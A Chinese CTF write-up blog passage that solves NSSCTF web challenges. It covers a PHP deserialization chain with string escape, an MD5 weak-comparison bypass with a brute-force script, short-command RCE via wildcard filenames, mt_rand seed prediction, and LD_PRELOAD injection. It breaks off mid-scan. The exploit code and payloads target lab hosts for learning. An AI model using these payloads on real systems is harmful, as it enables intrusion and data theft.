+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PERL"><figure class="iseeu highlight /perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UUCTF</span></span>&#123;</span><br><span class="line">    public <span class="variable">$name</span>,<span class="variable">$key</span>,<span class="variable">$basedata</span>,<span class="variable">$ob</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">output</span></span>&#123;</span><br><span class="line">    public <span class="variable">$a</span>;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nothing</span></span>&#123;</span><br><span class="line">    public <span class="variable">$a</span>;  </span><br><span class="line">    public <span class="variable">$b</span>;</span><br><span class="line">    public <span class="variable">$t</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">youwant</span></span>&#123;</span><br><span class="line">    public <span class="variable">$cmd</span>; </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = new youwant();</span><br><span class="line"><span class="variable">$a</span>-&gt;cmd = <span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = new output();</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span> = new nothing();</span><br><span class="line"><span class="variable">$c</span>-&gt;a = &amp;<span class="variable">$c</span>-&gt;b;</span><br><span class="line"><span class="variable">$c</span>-&gt;t = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$basedata</span> = base64_encode(serialize(<span class="variable">$c</span>));</span><br><span class="line"> </span><br><span class="line"><span class="variable">$post</span>=<span class="string">&#x27;&quot;;s:3:&quot;key&quot;;s:5:&quot;UUCTF&quot;;s:2:&quot;ob&quot;;N;s:8:&quot;basedata&quot;;s:&#x27;</span>.strlen(<span class="variable">$basedata</span>).<span class="string">&#x27;:&quot;&#x27;</span>.<span class="variable">$basedata</span>.<span class="string">&#x27;&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$post</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">$hacker</span>=<span class="variable">$hacker</span>.<span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">echo <span class="variable">$hacker</span>.<span class="variable">$post</span>;</span><br></pre></td></tr></table></figure></div>
+<p>然后用post发送data数据<br><img src="https://pic1.imgdb.cn/item/67b49075d0e0a243d400916a.png"><br>那只要把前面的ls 指令改成cat flag命令就可以得到flag 但是这里要用tac 不知道为什么<br>参考： <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_73904941/article/details/143440458">[UUCTF 2022 新生赛] ezpop 详细题解 (字符串逃逸)</a><br>这道题出的还是很好的，就是反序列化链和字符串逃逸，我也是第一次做字符串逃逸，这道题还是挺适合入门的，值得研究</p>
+<h1 id="funmd5"><a href="#funmd5" class="headerlink" title="funmd5"></a>funmd5</h1><p>题目：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$time</span>=<span class="title function_ invoke__">time</span>();</span><br><span class="line"><span class="variable">$guessmd5</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$time</span>);</span><br><span class="line"><span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&quot;md5&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$md5</span>))&#123;</span><br><span class="line">    <span class="variable">$sub</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$time</span>,-<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$md5</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/^(.*)0e(.*)$/&#x27;</span>,<span class="string">&#x27;$&#123;1&#125;no_science_notation!$&#123;2&#125;&#x27;</span>,<span class="variable">$md5</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/0e/&#x27;</span>,<span class="variable">$md5</span>[<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$md5</span>[<span class="number">0</span>]=<span class="title function_ invoke__">substr</span>(<span class="variable">$md5</span>[<span class="number">0</span>],<span class="variable">$sub</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$md5</span>[<span class="number">0</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>[<span class="number">0</span>])&amp;&amp;<span class="variable">$md5</span>[<span class="number">1</span>]===<span class="variable">$guessmd5</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;well!you win again!now flag is yours.&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$md5</span>[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;oh!no!maybe you need learn more PHP!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is your md5:<span class="subst">$md5</span>[0]&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;maybe you need more think think!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$sub</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$md5</span>[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$guessmd5</span>,<span class="number">0</span>,<span class="number">5</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;plase give me the md5!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="number">4</span>a175</span><br><span class="line">plase give me the md5!</span><br></pre></td></tr></table></figure></div>
+<p>这里的正则是过滤了科学计数法。如果 md5 以 0e 形式出现，则替换 0e 为 no_science_notation!<br>$sub 取 $time 的最后一位数字。<br>然后判断 <code>$md5[0]</code> 是否包含 0e，如果是，则进入处理逻辑。<br><code>$md5[0]</code> 截取 $sub 位置后的字符串。<br><code> if($md5[0]==md5($md5[0])&amp;&amp;$md5[1]===$guessmd5)&#123;</code> 前面一个是弱比较 后面一个是严格比较</p>
+<p>所以我们的md5要满足两个条件<br><code>md5[0] == md5(md5[0])</code><br>    需要找到一个 MD5 碰撞值，满足 <code>md5($input)</code> 生成 0e 形式的哈希值，使 <code>md5($input)</code> &#x3D;&#x3D; $input 成立。<br><code>md5[1] === $guessmd5</code><br>    <code>$md5[1]</code>需要等于 <code>md5($time)</code>。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$sub</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$md5</span>[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$guessmd5</span>,<span class="number">0</span>,<span class="number">5</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;plase give me the md5!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="number">4</span>a175</span><br><span class="line">plase give me the md5!</span><br></pre></td></tr></table></figure></div>
+<p>这部分给出了<code>$guessmd5</code>的前5位是<code>4a175</code></p>
+<p>现在一步步分析， 如果要满足<code>$md5[0]==md5($md5[0])</code> 可以选择<code>0e215962017</code>,但是刚才说有一个0e的替换<br>现在分析如果绕过<code>$md5=preg_replace(&#39;/^(.*)0e(.*)$/&#39;,&#39;$&#123;1&#125;no_science_notation!$&#123;2&#125;&#39;,$md5);</code><br>先理解这个正则的替换规则</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 Python 正则表达式中，<span class="string">&quot;.&quot;</span> 表示匹配除了换行符之外的任意单个字符，<span class="string">&quot;*&quot;</span> 表示匹配前面的字符零次或多次。因此，<span class="string">&quot;.*&quot;</span> 表示匹配任意长度的字符序列，这也被称为贪婪匹配 <span class="punctuation">(</span>greedy matching<span class="punctuation">)</span>。</span><br></pre></td></tr></table></figure>
+<p>所以注意到这个除了换行符以外，如果在0e之前是一个换行符，那这个正则就匹配不到了，所以用<code>%0a0e215962017</code><br>然后<code>$md5[0]=substr($md5[0],$sub);</code>这里会对我们的输入截取，所以让<code>$sub</code>&#x3D; 1 就可以绕过<br>最后一个满足的条件是<code>$md5[1]===$guessmd5</code>  那就可以用脚本发送请求包，然后让md5碰撞相等</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> concurrent.futures  //多线程</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://node5.anna.nssctf.cn:24604/?md5[0]=%0a0e215962017&amp;md5[1]=&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_md5</span>(<span class="params">t</span>):</span><br><span class="line">    md5_value = hashlib.md5(<span class="built_in">str</span>(t).encode()).hexdigest()</span><br><span class="line">    url = URL.<span class="built_in">format</span>(md5_value)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = requests.get(url, timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;win&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Success! Time: <span class="subst">&#123;t&#125;</span>, MD5: <span class="subst">&#123;md5_value&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess_md5</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        current_time = <span class="built_in">int</span>(time.time())</span><br><span class="line">        times_to_try = [current_time, current_time - <span class="number">1</span>, current_time + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=<span class="number">3</span>) <span class="keyword">as</span> executor:</span><br><span class="line">            results = executor.<span class="built_in">map</span>(check_md5, times_to_try)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(results):</span><br><span class="line">                <span class="keyword">break</span>  <span class="comment"># 如果成功，停止爆破</span></span><br><span class="line"></span><br><span class="line">guess_md5()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Success! Time: <span class="number">1740057131</span>, MD5: a98e4d04c331353cd0f2e59ade3a687c</span><br><span class="line">well!you win again!now flag <span class="keyword">is</span> yours.&lt;br&gt;NSSCTF&#123;d6652175-9bbd-<span class="number">4810</span>-9c85-2c73685557c3&#125;</span><br><span class="line">(base) kakeru@bogon python % python -u <span class="string">&quot;/Users/kakeru/python/web/funmd5.py&quot;</span></span><br><span class="line">/Users/kakeru/Library/Python/<span class="number">3.9</span>/lib/python/site-packages/urllib3/__init__.py:<span class="number">35</span>: NotOpenSSLWarning: urllib3 v2 only supports OpenSSL <span class="number">1.1</span><span class="number">.1</span>+, currently the <span class="string">&#x27;ssl&#x27;</span> module <span class="keyword">is</span> compiled <span class="keyword">with</span> <span class="string">&#x27;LibreSSL 2.8.3&#x27;</span>. See: https://github.com/urllib3/urllib3/issues/<span class="number">3020</span></span><br><span class="line">  warnings.warn(</span><br><span class="line">Success! Time: <span class="number">1740057131</span>, MD5: a98e4d04c331353cd0f2e59ade3a687c</span><br><span class="line">well!you win again!now flag <span class="keyword">is</span> yours.&lt;br&gt;NSSCTF&#123;d6652175-9bbd-<span class="number">4810</span>-9c85-2c73685557c3&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h1><p><img src="https://pic1.imgdb.cn/item/67b72c59d0e0a243d4010ef4.png"><br>随便输入一条命令，跳转到post.php 然后提示命令已在.&#x2F;tmp&#x2F; 目录下成功执行<br>准备输入<code>ping -c2 192.168.112.11 </code>验证命令是否执行，但是返回<code>你也太长了吧，删除你的 tmp 目录了</code><br>然后可以逐渐增加命令长度，最终得出命令长度的限制是6<br>这里要了解几个linux中的知识，<code>*</code>会把目录中的第一个匹配到的文件名当作命令 剩下的文件名当作参数执行</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="keyword">/tmp/</span>web]</span><br><span class="line">└─<span class="meta"># &gt;nl</span></span><br><span class="line">^C                        </span><br><span class="line">┌──(root㉿kakeru)-[~<span class="keyword">/tmp/</span>web]</span><br><span class="line">└─<span class="meta"># ls</span></span><br><span class="line">nl                      </span><br><span class="line">┌──(root㉿kakeru)-[~<span class="keyword">/tmp/</span>web]</span><br><span class="line">└─<span class="meta"># &gt;a                 </span></span><br><span class="line">^C                    </span><br><span class="line">┌──(root㉿kakeru)-[~<span class="keyword">/tmp/</span>web]</span><br><span class="line">└─<span class="meta"># *</span></span><br><span class="line"><span class="symbol">a:</span> command not found</span><br></pre></td></tr></table></figure></div>
+<p>这里就是创建了一个nl文件，用<code>*</code>就回执行nl指令，然后剩下的a当作参数执行<br>那现在这个命令长度限制的问题已经解决了，现在如何解决没有回显的问题呢？<br>用到的是重定向符<code>&gt;</code>这个可以把输出重定向一个文件中，因为题目告诉我们了目录是tmp所以我们可以访问&#x2F;tmp的文件<br>比如我现在用ls命令看现在根文件夹下面有什么  <code>ls &gt;a</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TCL"><figure class="iseeu highlight /tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line"><span class="keyword">proc</span><span class="title"></span></span><br><span class="line"><span class="title">root</span></span><br><span class="line">run<span class="title"></span></span><br><span class="line"><span class="title">sbin</span></span><br><span class="line">srv<span class="title"></span></span><br><span class="line"><span class="title">sys</span></span><br><span class="line">tmp<span class="title"></span></span><br><span class="line"><span class="title">usr</span></span><br><span class="line">var</span><br></pre></td></tr></table></figure></div>
+<p>现在知道了flag的位置，就可以用<code>*</code>的方法查看文件了</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="built_in">cat</span>  <span class="comment">#创建一个cat文件，利用文件名执行命令</span></span><br><span class="line"></span><br><span class="line">* /*&gt;b  <span class="comment"># 执行cat命令读根目录下面所有的文件重定向到b文件里</span></span><br><span class="line"></span><br><span class="line">http://node5.anna.nssctf.cn:20381/tmp/b <span class="comment">#访问b得到flag</span></span><br></pre></td></tr></table></figure></div>
+
+<h1 id="phonecode"><a href="#phonecode" class="headerlink" title="phonecode"></a>phonecode</h1><p><img src="https://pic1.imgdb.cn/item/67b731b5d0e0a243d4010fe3.png"><br>随便输入之后跳转到login.php</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Hint</span> :<span class="number">503573603</span></span><br><span class="line"><span class="attribute">Fool</span>!</span><br></pre></td></tr></table></figure></div>
+<p>但是我换了输入之后这个hint也跟着变了<br>这题完全不懂，看了别的wp知道这个是随机数<br>mt_srand()<br>作用：mt_srand(seed) 用于 初始化随机数生成器，其中 seed 是随机数种子。<br>影响：如果使用相同的 seed，那么后续调用 mt_rand() 生成的随机数 始终相同。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1</span>);  <span class="comment">// 设置随机数种子</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;\n&quot;</span>;  <span class="comment">// 生成第一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;\n&quot;</span>;  <span class="comment">// 生成第二个随机数</span></span><br><span class="line"></span><br><span class="line"><span class="number">895547922</span></span><br><span class="line"><span class="number">2141438069</span></span><br></pre></td></tr></table></figure></div>
+<p>每次运行之后的结果都是这两个数字不会变，所以只要固定种子，随机出来的值就是固定的<br>这里的phone就是种子  因为显示的是第一个随机数，那就把第二数当作验证码发送就可以得到flag</p>
+<h1 id="uploadandinject"><a href="#uploadandinject" class="headerlink" title="uploadandinject"></a>uploadandinject</h1><p>预备知识：<br>LD_PRELOAD 是 Linux 系统中的一个环境变量，用于在程序运行时动态加载指定的共享库。LD_PRELOAD 的作用是在程序运行前，将指定的共享库加载到程序的内存中。这样，程序在运行时会优先使用该共享库中的符号，而不是系统默认的符号。LD_PRELOAD 可以用于替换程序本身的函数，增加程序的功能或者调试程序。</p>
+<p>LD_PRELOAD 的工作原理是，当程序需要调用某个符号时，系统会先在程序自身的符号表中查找，如果找不到，则会在 LD_PRELOAD 指定的共享库中查找。如果在 LD_PRELOAD 指定的共享库中找到了该符号，则使用该符号中的代码。</p>
+<p>使用 LD_PRELOAD 可以实现一些特殊的功能，例如：</p>
+<p>动态库劫持：可以用 LD_PRELOAD 来劫持程序中的函数，替换为自己编写的函数，实现一些特殊的功能。</p>
+<p>程序调试：可以用 LD_PRELOAD 来替换程序中的函数，增加一些调试信息，例如，在程序中调用 printf 函数时，可以用 LD_PRELOAD 来替换为自己编写的函数，输出调试信息。</p>
+<p>库版本控制：可以用 LD_PRELOAD 来强制程序使用指定版本的共享库，以避免程序在不同版本的环境中产生兼容性问题。</p>
+<p><img src="https://pic1.imgdb.cn/item/67b73afcd0e0a243d4011266.png"><br>这里提示先去hint.php看看有什么<br><img src="https://pic1.imgdb.cn/item/67b73b6bd0e0a243d4011273.png"><br>这里有一个.swp文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># curl http://node5.anna.nssctf.cn:26479/.index.php.swp &gt; index.php.swp</span></span><br><span class="line">  % <span class="title class_">Total</span>    % <span class="title class_">Received</span> % <span class="title class_">Xferd</span>  <span class="title class_">Average</span> <span class="title class_">Speed</span>   <span class="title class_">Time</span>    <span class="title class_">Time</span>     <span class="title class_">Time</span>  <span class="title class_">Current</span></span><br><span class="line">                                 <span class="title class_">Dload</span>  <span class="title class_">Upload</span>   <span class="title class_">Total</span>   <span class="title class_">Spent</span>    <span class="title class_">Left</span>  <span class="title class_">Speed</span></span><br><span class="line"><span class="number">100</span> <span class="number">12288</span>  <span class="number">100</span> <span class="number">12288</span>    <span class="number">0</span>     <span class="number">0</span>   <span class="number">104</span>k      <span class="number">0</span> --<span class="symbol">:--</span><span class="symbol">:--</span> --<span class="symbol">:--</span><span class="symbol">:--</span> --<span class="symbol">:--</span><span class="symbol">:--</span>  <span class="number">104</span>k</span><br><span class="line">                                                                                                                                                        </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># vim -r index.php.swp</span></span><br></pre></td></tr></table></figure></div>
+<p>这里本机下载这个文件（记得后缀名要是.swp） 然后用 vim -r 恢复交换文件查看，看到源代码<br><img src="https://pic1.imgdb.cn/item/67b73d1ad0e0a243d40112b4.png"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv(<span class="string">&quot;LD_PRELOAD=/var/www/html/$img_path&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></div>
+<p>这里用到了LD_PRELOAD。想要利用这个LD_PRELOAD就要上传.so文件，现在先找到上传的地方</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># dirsearch -u http://node5.anna.nssctf.cn:26479/</span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/http_node5.anna.nssctf.cn_26479/__25-02-20_22-41-01.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span>node5.anna.nssctf.cn:<span class="number">26479</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span>                                      </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span>                                   </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span 